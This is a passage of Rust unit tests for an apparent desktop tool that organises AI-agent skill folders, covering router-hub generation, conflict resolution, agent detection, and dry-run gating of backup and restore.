        let conflicts = derive_skill_conflicts(&skills, &saved);
        assert_eq!(conflicts[0].status, "auto-set");
        assert!(!conflicts[0].default_skill_id.is_empty());
        assert_eq!(conflicts[0].default_source_name, "Nature-Paper-Skills");
    }

    #[test]
    fn parent_isolation_removes_stale_global_conflict_dispatchers() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-conflict-dispatcher-test-{}",
            unix_timestamp_string()
        ));
        let skills = vec![
            test_skill_card(
                "figure-planner",
                "Nature-Paper-Skills",
                "Nature-Paper-Skills/skills/core/figure-planner",
                false,
            ),
            test_skill_card(
                "figure-planner",
                "PaperSpine",
                "PaperSpine/dist/codex/skills/figure-planner",
                false,
            ),
        ];
        let mut saved = HashMap::new();
        saved.insert(
            "figure-planner".to_string(),
            SkillConflictChoiceState {
                default_skill_id: "PaperSpine/dist/codex/skills/figure-planner".to_string(),
                status: "default-set".to_string(),
                updated_at: "1780000000".to_string(),
            },
        );

        let dispatcher = active_sources_dir(&root)
            .join(ROUTER_HUB_FOLDER)
            .join("figure-planner")
            .join("SKILL.md");
        let nature_alias = active_sources_dir(&root)
            .join(ROUTER_HUB_FOLDER)
            .join("nature-paper-skills-figure-planner")
            .join("SKILL.md");
        let paperspine_alias = active_sources_dir(&root)
            .join(ROUTER_HUB_FOLDER)
            .join("paperspine-figure-planner")
            .join("SKILL.md");
        for file in [&dispatcher, &nature_alias, &paperspine_alias] {
            fs::create_dir_all(file.parent().unwrap()).unwrap();
            fs::write(
                file,
                format!(
                    "---\nname: stale\ndescription: \"{} stale\"\n---\n",
                    CONFLICT_DISPATCHER_MARKER
                ),
            )
            .unwrap();
        }

        let changed = sync_skill_conflict_dispatchers_for_skills(&root, &skills, &saved)
            .expect("stale conflict dispatchers should be removed");
        assert_eq!(changed, 3);
        assert!(!dispatcher.exists());
        assert!(!nature_alias.exists());
        assert!(!paperspine_alias.exists());

        saved.insert(
            "figure-planner".to_string(),
            SkillConflictChoiceState {
                default_skill_id: String::new(),
                status: "unresolved".to_string(),
                updated_at: "1780000001".to_string(),
            },
        );
        let automatic = sync_skill_conflict_dispatchers_for_skills(&root, &skills, &saved)
            .expect("parent-scoped mode should remain stable");
        assert_eq!(automatic, 0);
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn parse_agents_keeps_command_detected_antigravity() {
        let diagnostics = serde_json::json!({
            "agents": [
                {
                    "id": "antigravity",
                    "name": "Antigravity",
                    "detected": true,
                    "command": "D:/Tools/Antigravity/bin/antigravity.cmd",
                    "skillsDirs": [
                        {
                            "path": "C:/Users/Test/.gemini/antigravity/skills",
                            "exists": true,
                            "writable": true,
                            "isLink": false
                        }
                    ]
                }
            ]
        });
        let agents = parse_agents(Some(&diagnostics));
        let antigravity = agents.first().expect("agent should parse");
        assert!(antigravity.detected);
        assert!(antigravity.managed);

        let directory_only = serde_json::json!({
            "agents": [
                {
                    "id": "antigravity",
                    "name": "Antigravity",
                    "detected": true,
                    "command": "",
                    "skillsDirs": [
                        {
                            "path": "C:/Users/Test/.gemini/antigravity/skills",
                            "exists": true,
                            "writable": true,
                            "isLink": false
                        }
                    ]
                }
            ]
        });
        let agents = parse_agents(Some(&directory_only));
        let antigravity = agents.first().expect("agent should parse");
        assert!(!antigravity.detected);
        assert!(!antigravity.managed);
    }

    #[test]
    fn parse_agents_keeps_explicit_claude_desktop_detection() {
        let diagnostics = serde_json::json!({
            "agents": [
                {
                    "id": "claude",
                    "name": "Claude Desktop / Claude Code",
                    "detected": true,
                    "desktopDetected": true,
                    "codeDetected": false,
                    "command": "",
                    "skillsDirs": [
                        {
                            "path": "C:/Users/Test/.claude/skills",
                            "exists": false,
                            "writable": false,
                            "isLink": false
                        }
                    ]
                }
            ]
        });

        let agents = parse_agents(Some(&diagnostics));
        let claude = agents.first().expect("Claude Desktop should parse");
        assert!(claude.detected);
        assert!(!claude.managed);
        assert!(!claude.enabled);
    }

    #[test]
    fn parse_agents_marks_chatgpt_desktop_managed_only_with_delivered_skills() {
        let diagnostics = serde_json::json!({
            "agents": [
                {
                    "id": "codex",
                    "name": "ChatGPT Desktop / OpenAI Codex",
                    "detected": true,
                    "desktopDetected": true,
                    "codeDetected": false,
                    "command": "",
                    "skillsDirs": [
                        {
                            "path": "C:/Users/Test/.agents/skills",
                            "exists": true,
                            "writable": true,
                            "isLink": false,
                            "containsSkillMd": true
                        }
                    ]
                }
            ]
        });

        let agents = parse_agents(Some(&diagnostics));
        let codex = agents.first().expect("ChatGPT Desktop should parse");
        assert!(codex.detected);
        assert!(codex.managed);
        assert!(codex.enabled);
    }

    #[test]
    fn router_hub_name_preserves_original_collection_name() {
        // Per skill-router-standard.md rule 3, parent must remain callable as /<collection>.
        // No global suffix — only normalize whitespace / case to match V1's Normalize-SkillLookupName.
        assert_eq!(router_hub_skill_name("nature-skills"), "nature-skills");
        assert_eq!(router_hub_skill_name("Nature Skills"), "nature-skills");
        assert_eq!(
            router_hub_skill_name("research_writing_skill"),
            "research-writing-skill"
        );
    }

    #[test]
    fn compute_is_router_hub_uses_three_signals() {
        // 1. Description marker
        assert!(compute_is_router_hub(
            "[ROUTER-HUB] aggregates several Skills",
            "skills\\nature-skills",
            "nature-skills",
            "nature-skills",
            "nature-skills",
        ));
        // 2. Path under AI-SkillHub-local-routers
        assert!(compute_is_router_hub(
            "plain description",
            "app\\github_sources\\AI-SkillHub-local-routers\\nature-skills-hub",
            "nature-skills",
            "nature-skills-hub",
            "nature-skills-hub",
        ));
        // 3. Skill name matches collection name (V1 convention)
        assert!(compute_is_router_hub(
            "plain description",
            "skills\\nature-skills",
            "nature-skills",
            "nature-skills",
            "nature-skills",
        ));
        // Negative case
        assert!(!compute_is_router_hub(
            "regular child skill",
            "skills\\nature-figure",
            "nature-skills",
            "nature-figure",
            "nature-figure",
        ));
    }

    #[test]
    fn source_tree_scan_indexes_unlinked_skill_dirs() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-source-tree-scan-test-{}",
            unix_timestamp_string()
        ));
        let sources_dir = root.join("github_sources");
        let source_dir = sources_dir.join("figure-pack");
        let child_dir = source_dir.join("skills").join("figure-planner");
        fs::create_dir_all(&child_dir).expect("source child should be created");
        fs::write(
            child_dir.join("SKILL.md"),
            "---\nname: figure-planner\ndescription: Plan manuscript figures.\n---\nbody\n",
        )
        .expect("skill file should be written");

        let source = SourceCard {
            id: stable_id("source", "figure-pack"),
            name: "figure-pack".to_string(),
            source_type: "skill".to_string(),
            health: "ok".to_string(),
            url: String::new(),
            skill_count: 0,
            mode: "scan".to_string(),
            category_id: "academic-writing".to_string(),
            note: String::new(),
            local_path: source_dir.display().to_string(),
            enabled: true,
            rating: 0,
            tags: Vec::new(),
            created_at: "1".to_string(),
            usage_guide: String::new(),
            metadata_origin: "test".to_string(),
            metadata_confidence: 1.0,
            user_folder_id: String::new(),
            user_folder_name: String::new(),
            user_folder_color: String::new(),
        };

        let scanned = scan_source_tree_skills(&sources_dir, &[source], &HashMap::new(), &[]);

        assert_eq!(scanned.len(), 1);
        assert_eq!(scanned[0].name, "figure-planner");
        assert_eq!(scanned[0].source, "figure-pack");
        assert_eq!(scanned[0].health, "ok");
        assert!(!scanned[0].is_router_hub);

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_scan_hides_internal_router_storage() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-hidden-router-source-test-{}",
            unix_timestamp_string()
        ));
        let sources_dir = root.join("github_sources");
        fs::create_dir_all(sources_dir.join("Nature-Paper-Skills"))
            .expect("managed source should be created");
        fs::create_dir_all(sources_dir.join(ROUTER_HUB_FOLDER))
            .expect("internal router storage should be created");

        let sources = scan_sources(&sources_dir, &HashMap::new());

        assert_eq!(sources.len(), 1);
        assert_eq!(sources[0].name, "Nature-Paper-Skills");

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn stale_or_relocated_source_index_requests_portable_refresh() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-portable-source-refresh-test-{}",
            unix_timestamp_string()
        ));
        let current_source = active_sources_dir(&root).join("figure-pack");
        let child_dir = current_source.join("skills").join("figure-planner");
        fs::create_dir_all(&child_dir).expect("portable source child should be created");
        fs::write(
            child_dir.join("SKILL.md"),
            "---\nname: figure-planner\ndescription: Plan figures.\n---\n",
        )
        .expect("portable test SKILL.md should be written");

        let stale_path = root
            .join("old-computer")
            .join("github_sources")
            .join("figure-pack");
        let mut source = test_source_card(
            "source-figure-pack",
            "figure-pack",
            &stale_path,
            "https://github.com/example/figure-pack.git",
        );
        source.skill_count = 0;
        let snapshot = test_snapshot(&root, vec![source], Vec::new(), Vec::new());

        assert!(indexed_snapshot_needs_portable_source_refresh(
            &root, &snapshot
        ));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn single_root_skill_is_not_reported_as_router_hub() {
        let mut skills = vec![SkillCard {
            id: stable_id("skill", "VibeSec-Skill"),
            source_id: String::new(),
            name: "VibeSec-Skill".to_string(),
            folder_name: "VibeSec-Skill".to_string(),
            category: "security".to_string(),
            description: "Secure coding guidance.".to_string(),
            note: String::new(),
            source: "VibeSec-Skill".to_string(),
            health: "ok".to_string(),
            enabled: true,
            rating: 0,
            relative_path: "skills\\VibeSec-Skill".to_string(),
            tags: Vec::new(),
            usage_guide: String::new(),
            metadata_origin: "test".to_string(),
            metadata_confidence: 1.0,
            is_router_hub: true,
            user_folder_id: String::new(),
            user_folder_name: String::new(),
            user_folder_color: String::new(),
        }];

        demote_single_source_root_skills(&mut skills);

        assert!(!skills[0].is_router_hub);
    }

    #[test]
    fn generated_router_hub_skill_resolves_to_original_source() {
        let mut source_ids = HashMap::new();
        source_ids.insert(
            ROUTER_HUB_FOLDER.to_lowercase(),
            "source-internal-router".to_string(),
        );
        source_ids.insert("nature-skills".to_string(), "source-nature".to_string());

        let skill = SkillCard {
            id: stable_id("skill", "nature-skills"),
            source_id: String::new(),
            name: "nature-skills".to_string(),
            folder_name: "nature-skills".to_string(),
            category: "academic-writing".to_string(),
            description: "[ROUTER-HUB] Nature skill collection".to_string(),
            note: String::new(),
            source: ROUTER_HUB_FOLDER.to_string(),
            health: "ok".to_string(),
            enabled: true,
            rating: 0,
            relative_path: "app\\github_sources\\AI-SkillHub-local-routers\\nature-skills"
                .to_string(),
            tags: Vec::new(),
            usage_guide: String::new(),
            metadata_origin: "test".to_string(),
            metadata_confidence: 1.0,
            is_router_hub: true,
            user_folder_id: String::new(),
            user_folder_name: String::new(),
            user_folder_color: String::new(),
        };

        assert_eq!(
            resolve_skill_source_id(&skill, &source_ids).as_deref(),
            Some("source-nature")
        );
    }

    #[test]
    fn orphaned_internal_routers_are_not_user_visible_skills() {
        let source_path = PathBuf::from("github_sources").join("Nature-Paper-Skills");
        let source = test_source_card(
            "source-nature-paper-skills",
            "Nature-Paper-Skills",
            &source_path,
            "https://github.com/example/Nature-Paper-Skills.git",
        );
        let mut skills = vec![
            test_skill_card(
                "Nature-Paper-Skills",
                ROUTER_HUB_FOLDER,
                "github_sources\\AI-SkillHub-local-routers\\Nature-Paper-Skills",
                true,
            ),
            test_skill_card(
                "Nature-Paper-Skills-reviewer",
                ROUTER_HUB_FOLDER,
                "github_sources\\AI-SkillHub-local-routers\\Nature-Paper-Skills-reviewer",
                true,
            ),
            test_skill_card("editor", "local", "skills\\editor", false),
        ];

        retain_user_visible_skills(&mut skills, &[source]);

        assert_eq!(skills.len(), 2);
        assert!(skills
            .iter()
            .any(|skill| skill.name == "Nature-Paper-Skills"));
        assert!(skills.iter().any(|skill| skill.name == "editor"));
        assert!(!skills
            .iter()
            .any(|skill| skill.name == "Nature-Paper-Skills-reviewer"));
    }

    #[test]
    fn router_hub_health_warning_fires_on_unquoted_marker() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-router-quote-test-{}",
            unix_timestamp_string()
        ));
        let folder = root.join("offender");
        fs::create_dir_all(&folder).expect("test folder should be created");
        let skill_md = folder.join("SKILL.md");
        // Description starts with [ROUTER-HUB] but is NOT quoted — the YAML pitfall.
        fs::write(
            &skill_md,
            "---\nname: offender\ndescription: [ROUTER-HUB] this will be dropped\n---\nbody\n",
        )
        .expect("test SKILL.md should be written");
        let warning = check_router_hub_description_quoting(&skill_md);
        assert!(warning.is_some(), "unquoted marker should warn");
        // Now quote it — should pass.
        fs::write(
            &skill_md,
            "---\nname: ok\ndescription: \"[ROUTER-HUB] safely quoted\"\n---\nbody\n",
        )
        .expect("rewrite should succeed");
        let warning_after = check_router_hub_description_quoting(&skill_md);
        assert!(warning_after.is_none(), "quoted marker should not warn");
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn router_hub_generation_fails_closed_when_output_root_is_invalid() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-router-fail-closed-test-{}",
            unix_timestamp_string()
        ));
        let sources_dir = active_sources_dir(&root);
        let child = sources_dir.join("research-suite").join("paper-review");
        fs::create_dir_all(&child).expect("test child should be created");
        fs::write(
            child.join("SKILL.md"),
            "---\nname: paper-review\ndescription: \"review\"\n---\nbody\n",
        )
        .expect("test Skill should be written");

        // A file at the reserved router directory makes parent creation fail.
        // Sync callers use `?`, so this error prevents the later catalog publish.
        fs::write(sources_dir.join(ROUTER_HUB_FOLDER), "not a directory")
            .expect("invalid router root fixture should be written");
        let error = match plan_or_write_router_hubs(&root, true, true) {
            Ok(_) => panic!("router generation must fail instead of publishing partially"),
            Err(error) => error,
        };
        assert!(
            error.contains("Failed to create") || error.contains("Cannot"),
            "unexpected bounded error: {error}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn router_hub_same_name_child_stays_source_scoped_under_parent() {
        // Collection `nature-skills` contains a child literally named `nature-skills`.
        // The parent keeps the stable collection name while the same-name source
        // Skill remains reachable only through its explicit source-scoped file.
        let root = std::env::temp_dir().join(format!(
            "skillhub-router-collision-test-{}",
            unix_timestamp_string()
        ));
        let sources_dir = active_sources_dir(&root);
        let collection = sources_dir.join("nature-skills");
        // Child #1 shares the parent name — the collision case.
        let same_name = collection.join("nature-skills");
        fs::create_dir_all(&same_name).unwrap();
        fs::write(
            same_name.join("SKILL.md"),
            "---\nname: nature-skills\ndescription: \"shadows the parent\"\n---\nbody\n",
        )
        .unwrap();
        // Child #2 keeps the collection above the >=2 threshold.
        let unique = collection.join("nature-figure");
        fs::create_dir_all(&unique).unwrap();
        fs::write(
            unique.join("SKILL.md"),
            "---\nname: nature-figure\ndescription: \"plain child\"\n---\nbody\n",
        )
        .unwrap();

        let report = plan_or_write_router_hubs(&root, true, true)
            .expect("same-name source child should stay routable");
        let plan = report
            .plans
            .iter()
            .find(|plan| plan.collection_name == "nature-skills")
            .expect("nature-skills plan should exist");
        assert_eq!(plan.status, "written");
        assert_eq!(plan.router_skill_name, "nature-skills");
        let router = sources_dir
            .join("AI-SkillHub-local-routers")
            .join("nature-skills")
            .join("SKILL.md");
        let body = fs::read_to_string(router).expect("parent router should be written");
        assert!(body.contains("../../nature-skills/nature-skills/SKILL.md"));
        assert!(body.contains("../../nature-skills/nature-figure/SKILL.md"));
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn router_hub_aggregates_cross_collection_duplicate_children() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-router-dup-test-{}",
            unix_timestamp_string()
        ));
        let sources_dir = active_sources_dir(&root);
        // Two distinct collections, each with a child named "shared-skill".
        for collection in &["alpha", "beta"] {
            let shared = sources_dir.join(collection).join("shared-skill");
            fs::create_dir_all(&shared).unwrap();
            fs::write(
                shared.join("SKILL.md"),
                "---\nname: shared-skill\ndescription: \"shared\"\n---\nbody\n",
            )
            .unwrap();
            // Each also needs a second unique child so the collection passes the >=2 threshold.
            let unique = sources_dir
                .join(collection)
                .join(format!("{}-only", collection));
            fs::create_dir_all(&unique).unwrap();
            fs::write(
                unique.join("SKILL.md"),
                format!(
                    "---\nname: {0}-only\ndescription: \"u\"\n---\nbody\n",
                    collection
                ),
            )
            .unwrap();
        }
        let report =
            plan_or_write_router_hubs(&root, false, false).expect("router report should build");
        let dup = report
            .duplicate_children
            .iter()
            .find(|item| item.child_name == "shared-skill")
            .expect("duplicate aggregation should include shared-skill");
        assert!(dup.collections.contains(&"alpha".to_string()));
        assert!(dup.collections.contains(&"beta".to_string()));
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn parent_router_links_only_to_its_own_source_children() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-router-source-scope-test-{}",
            unix_timestamp_string()
        ));
        let sources_dir = active_sources_dir(&root);
        for collection in &["alpha", "beta"] {
            let children = vec!["shared-review".to_string(), format!("{}-only", collection)];
            for child in children {
                let folder = sources_dir.join(collection).join(&child);
                fs::create_dir_all(&folder).unwrap();
                fs::write(
                    folder.join("SKILL.md"),
                    format!("---\nname: {child}\ndescription: \"scoped\"\n---\nbody\n"),
                )
                .unwrap();
            }
        }

        plan_or_write_router_hubs(&root, true, true).expect("routers should build");
        let alpha = fs::read_to_string(
            sources_dir
                .join(ROUTER_HUB_FOLDER)
                .join("alpha")
                .join("SKILL.md"),
        )
        .unwrap();
        let beta = fs::read_to_string(
            sources_dir
                .join(ROUTER_HUB_FOLDER)
                .join("beta")
                .join("SKILL.md"),
        )
        .unwrap();

        assert!(alpha.contains("../../alpha/shared-review/SKILL.md"));
        assert!(!alpha.contains("../../beta/"));
        assert!(beta.contains("../../beta/shared-review/SKILL.md"));
        assert!(!beta.contains("../../alpha/"));
        assert!(alpha.contains("绝不跨来源替换"));
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn router_hub_keeps_only_the_canonical_parent_name() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-router-alias-test-{}",
            unix_timestamp_string()
        ));
        let sources_dir = active_sources_dir(&root);
        let collection = sources_dir.join("Literature-Mind");
        for child in &["litmind-analyzer", "litmind-review", "litmind-zotero"] {
            let folder = collection.join(child);
            fs::create_dir_all(&folder).unwrap();
            fs::write(
                folder.join("SKILL.md"),
                format!("---\nname: {child}\ndescription: \"litmind child\"\n---\nbody\n"),
            )
            .unwrap();
        }
        let stale_alias = sources_dir
            .join("AI-SkillHub-local-routers")
            .join("litmind")
            .join("SKILL.md");
        fs::create_dir_all(stale_alias.parent().unwrap()).unwrap();
        fs::write(
            &stale_alias,
            "---\nname: litmind\ndescription: \"[ROUTER-HUB] old alias\"\n---\n",
        )
        .unwrap();

        let report =
            plan_or_write_router_hubs(&root, true, true).expect("router report should build");
        assert_eq!(report.total_collections, 1);
        assert_eq!(report.written_count, 1);
        assert!(report
            .plans
            .iter()
            .any(|plan| plan.router_skill_name == "literature-mind"));
        assert!(!report
            .plans
            .iter()
            .any(|plan| plan.router_skill_name == "litmind"));

        let canonical = sources_dir
            .join("AI-SkillHub-local-routers")
            .join("literature-mind")
            .join("SKILL.md");
        assert!(canonical.exists(), "canonical parent should be written");
        let body = fs::read_to_string(canonical).unwrap();
        assert!(body.contains("name: literature-mind"));
        assert!(body.contains("- [CHILD-SKILL] `$litmind-zotero`"));
        assert!(
            !stale_alias.exists(),
            "old short parent alias should be removed"
        );

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn router_hub_writes_audit_event() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-router-audit-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("sqlite should open");
        let dry = plan_or_write_router_hubs(&root, false, false).expect("dry-run should succeed");
        record_router_hub_audit(&connection, &dry).expect("audit write should succeed");
        let events = read_indexed_audit_events(&connection).expect("audit events should read");
        assert!(
            events
                .iter()
                .any(|event| event.event_type == "router_hub_regenerate"),
            "router_hub_regenerate event must be recorded"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn router_hub_dry_run_includes_single_child_and_writes_only_on_consent() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-router-plan-test-{}",
            unix_timestamp_string()
        ));
        let sources_dir = active_sources_dir(&root);
        // Collection with two children → should be planned/written.
        let two_child = sources_dir.join("paper-pack");
        fs::create_dir_all(two_child.join("paper-workflow")).unwrap();
        fs::write(
            two_child.join("paper-workflow").join("SKILL.md"),
            "---\nname: paper-workflow\ndescription: \"draft a paper\"\n---\nbody\n",
        )
        .unwrap();
        fs::create_dir_all(two_child.join("figure-planner")).unwrap();
        fs::write(
            two_child.join("figure-planner").join("SKILL.md"),
            "---\nname: figure-planner\ndescription: \"plan figures\"\n---\nbody\n",
        )
        .unwrap();
        // Collection with only one child still needs a stable parent entry.
        let one_child = sources_dir.join("loner");
        fs::create_dir_all(one_child.join("solo-skill")).unwrap();
        fs::write(
            one_child.join("solo-skill").join("SKILL.md"),
            "---\nname: solo-skill\ndescription: \"only one\"\n---\nbody\n",
        )
        .unwrap();

        // Dry-run plan — consent off → nothing written.
        let dry = plan_or_write_router_hubs(&root, true, false)
            .expect("dry-run should succeed even without consent");
        assert!(!dry.committed, "consent off must keep dry-run state");
        assert_eq!(dry.written_count, 0);
        let paper = dry
            .plans
            .iter()
            .find(|plan| plan.collection_name == "paper-pack")
            .expect("paper-pack plan should exist");
        assert_eq!(paper.status, "planned");
        // Standard rule 3: parent stays callable by the original collection name.
        assert_eq!(paper.router_skill_name, "paper-pack");
        assert!(!sources_dir.join("AI-SkillHub-local-routers").exists());
        let lone = dry
            .plans
            .iter()
            .find(|plan| plan.collection_name == "loner")
            .expect("loner plan should exist");
        assert_eq!(lone.status, "planned");
        assert_eq!(lone.router_skill_name, "loner");

        // Commit + consent → router file appears.
        let live = plan_or_write_router_hubs(&root, true, true).expect("commit should succeed");
        assert!(live.committed);
        assert_eq!(live.written_count, 2, "both sources need parent entries");
        assert_eq!(live.unchanged_count, 0);
        let written = sources_dir
            .join("AI-SkillHub-local-routers")
            .join("paper-pack")
            .join("SKILL.md");
        assert!(
            written.exists(),
            "router SKILL.md should exist at the original collection name"
        );
        let body = fs::read_to_string(&written).unwrap();
        assert!(body.contains("description: \"◈ 父 · 2 个子项 ·"));
        assert!(body.contains("<!-- [ROUTER-HUB] -->"));
        assert!(!body.contains("# [ROUTER-HUB]"));
        assert!(body.contains("# ◈ 父 Skill · paper-pack"));
        assert!(body.contains("name: paper-pack"));
        assert!(body.contains("- [CHILD-SKILL] `$paper-workflow`"));
        assert!(body.contains("- [CHILD-SKILL] `$figure-planner`"));
        let lone_router = sources_dir
            .join("AI-SkillHub-local-routers")
            .join("loner")
            .join("SKILL.md");
        let lone_body = fs::read_to_string(lone_router).expect("single-child parent should exist");
        assert!(lone_body.contains("- [CHILD-SKILL] `$solo-skill`"));

        let rerun = plan_or_write_router_hubs(&root, true, true)
            .expect("rerun should leave current routers untouched");
        assert!(rerun.committed);
        assert_eq!(rerun.written_count, 0);
        assert_eq!(rerun.unchanged_count, 2);
        let unchanged = rerun
            .plans
            .iter()
            .find(|plan| plan.collection_name == "paper-pack")
            .expect("paper-pack plan should still exist");
        assert_eq!(unchanged.status, "unchanged");

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn import_previews_keep_imports_read_only_and_gate_zip() {
        let sources = vec![
            SourceCard {
                id: "source-github".to_string(),
                name: "github-skill-pack".to_string(),
                source_type: "skill".to_string(),
                health: "ok".to_string(),
                url: "https://github.com/example/skills.git".to_string(),
                skill_count: 3,
                mode: "scan".to_string(),
                category_id: "agent-tools".to_string(),
                note: String::new(),
                local_path: "app-next/data/github_sources/github-skill-pack".to_string(),
                enabled: true,
                rating: 0,
                tags: vec!["agent-tools".to_string()],
                created_at: "2026-05-29T00:00:00Z".to_string(),
                usage_guide: String::new(),
                metadata_origin: "test".to_string(),
                metadata_confidence: 1.0,
                user_folder_id: String::new(),
                user_folder_name: String::new(),
                user_folder_color: String::new(),
            },
            SourceCard {
                id: "source-prompt".to_string(),
                name: "prompt-library".to_string(),
                source_type: "prompt".to_string(),
                health: "info".to_string(),
                url: "https://github.com/example/prompts.git".to_string(),
                skill_count: 0,
                mode: "do-not-install".to_string(),
                category_id: "prompt".to_string(),
                note: String::new(),
                local_path: "app-next/data/github_sources/prompt-library".to_string(),
                enabled: true,
                rating: 0,
                tags: vec!["prompt".to_string()],
                created_at: "2026-05-28T00:00:00Z".to_string(),
                usage_guide: String::new(),
                metadata_origin: "test".to_string(),
                metadata_confidence: 1.0,
                user_folder_id: String::new(),
                user_folder_name: String::new(),
                user_folder_color: String::new(),
            },
            SourceCard {
                id: "source-local".to_string(),
                name: "local-skill-pack".to_string(),
                source_type: "skill".to_string(),
                health: "ok".to_string(),
                url: String::new(),
                skill_count: 2,
                mode: "manual".to_string(),
                category_id: "ui-design".to_string(),
                note: String::new(),
                local_path: "D:\\Skills\\local-skill-pack".to_string(),
                enabled: true,
                rating: 0,
                tags: vec!["ui-design".to_string()],
                created_at: "2026-05-27T00:00:00Z".to_string(),
                usage_guide: String::new(),
                metadata_origin: "test".to_string(),
                metadata_confidence: 1.0,
                user_folder_id: String::new(),
                user_folder_name: String::new(),
                user_folder_color: String::new(),
            },
        ];
        let reports = vec![ReleaseReportCard {
            id: "zip-preview".to_string(),
            title: "zip 导入预览".to_string(),
            report_type: "zip-preview-test".to_string(),
            status: "ok".to_string(),
            generated_at: "2026-05-29".to_string(),
            version: String::new(),
            ok: true,
            total: 4,
            passed: 4,
            warn: 0,
            error: 0,
            summary: "zip 预览：2 个 Skill 可识别；路径穿越防护已通过。".to_string(),
        }];

        let previews = derive_import_previews(
            Path::new("C:\\AI-SkillHub-Test\\app\\github_sources"),
            &sources,
            &reports,
        );
        let github = previews
            .iter()
            .find(|preview| preview.import_kind == "github")
            .expect("github preview should exist");
        let local = previews
            .iter()
            .find(|preview| preview.import_kind == "local")
            .expect("local preview should exist");
        let zip = previews
            .iter()
            .find(|preview| preview.import_kind == "zip")
            .expect("zip preview should exist");

        assert_eq!(github.status, "ready");
        assert_eq!(github.skill_count, 3);
        assert_eq!(github.prompt_count, 1);
        assert_eq!(local.skill_count, 2);
        assert!(zip.safe_to_continue);
        assert!(zip.detail.contains("只读"));
    }

    #[test]
    fn agent_adapter_registry_has_core_agents() {
        let adapters = agent_adapter_catalog();
        let ids = adapters
            .iter()
            .map(|adapter| adapter.id.as_str())
            .collect::<Vec<_>>();

        assert!(ids.contains(&"claude"));
        assert!(ids.contains(&"codex"));
        assert!(ids.contains(&"antigravity"));
        assert!(ids.contains(&"cursor"));
    }

    #[test]
    fn adapter_capabilities_include_project_scope_metadata() {
        let adapters = agent_adapter_catalog();
        let capabilities = derive_adapter_capabilities(&adapters);

        assert!(capabilities
            .iter()
            .any(|capability| capability.adapter_id == "claude"
                && capability.capability_key == "project-scope"
                && capability.enabled));
        assert!(capabilities
            .iter()
            .any(|capability| capability.adapter_id == "amp"
                && capability.capability_key == "project-scope"
                && !capability.enabled));
    }

    #[test]
    fn project_scan_tracks_workspace_instruction_files() {
        let root = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("..")
            .join("..")
            .canonicalize()
            .expect("repository root should resolve");
        let workspaces = derive_workspaces(&root, &[], 0);
        let scans = derive_project_scans(&root, &workspaces);
        let app_next = scans
            .iter()
            .find(|scan| scan.path.ends_with("app-next"))
            .expect("app-next project workspace should be scanned");

        assert!(app_next.has_package_json);
        assert!(app_next.has_cargo_toml);
        assert!(app_next.has_tauri_config);
        assert!(app_next.has_readme_md);
        assert!(app_next.file_count > 0);
    }

    #[test]
    fn rollback_plan_locks_real_restore_until_backup_exists() {
        let snapshot = scan_legacy_snapshot_blocking().expect("legacy snapshot should scan");
        let steps = rollback_plan_steps(&snapshot, "test-snapshot");

        assert_eq!(steps.len(), 5);
        assert!(steps
            .iter()
            .any(|step| step.title.contains("SQLite") && step.status == "ready"));
        assert!(steps
            .iter()
            .any(|step| step.title.contains("真实回滚") && step.status == "locked"));
    }

    #[test]
    fn backup_targets_block_detected_unmanaged_adapters_until_confirmed() {
        let root = resolve_legacy_root().expect("legacy root should resolve");
        let mut adapter = agent_adapter(
            "codex",
            "OpenAI Codex",
            "OpenAI",
            "~\\.agents\\skills",
            "global",
        );
        adapter.detected = true;
        adapter.managed = false;
        adapter.enabled = false;

        let targets = derive_backup_targets(&root, &[adapter]);
        let target = targets.first().expect("backup target should be derived");

        assert!(target.required);
        assert_eq!(target.preflight_status, "blocked");
        assert_eq!(target.risk_level, "medium");
        assert!(target.blocker.contains("尚未接管"));
        assert!(target.backup_path.contains(".skillhub-next"));
    }

    #[test]
    fn restore_dry_run_never_executes_blocked_targets() {
        let root = resolve_legacy_root().expect("legacy root should resolve");
        let mut adapter = agent_adapter(
            "codex",
            "OpenAI Codex",
            "OpenAI",
            "~\\.agents\\skills",
            "global",
        );
        adapter.detected = true;
        adapter.managed = false;

        let targets = derive_backup_targets(&root, &[adapter]);
        let dry_run = derive_restore_dry_run(&targets);
        let item = dry_run.first().expect("dry-run item should be derived");

        assert_eq!(item.action, "block-restore");
        assert_eq!(item.status, "blocked");
        assert!(item.summary.contains("不能进入真实恢复"));
    }

    #[test]
    fn backup_dry_run_never_copies_blocked_targets() {
        let root = resolve_legacy_root().expect("legacy root should resolve");
        let mut adapter = agent_adapter(
            "codex",
            "OpenAI Codex",
            "OpenAI",
            "~\\.agents\\skills",
            "global",
        );
        adapter.detected = true;
        adapter.managed = false;

        let targets = derive_backup_targets(&root, &[adapter]);
        let dry_run = derive_backup_dry_run(&targets);
        let item = dry_run
            .first()
            .expect("backup dry-run item should be derived");

        assert_eq!(item.action, "block-backup");
        assert_eq!(item.status, "blocked");
        assert!(item.summary.contains("不复制任何文件"));
    }

    #[test]
    fn release_reports_parse_v2_preflight_inputs_without_paths() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-release-report-test-{}",
            unix_timestamp_string()
        ));
        let reports = root.join("app-next").join("reports");
        fs::create_dir_all(reports.join("release-preflight"))
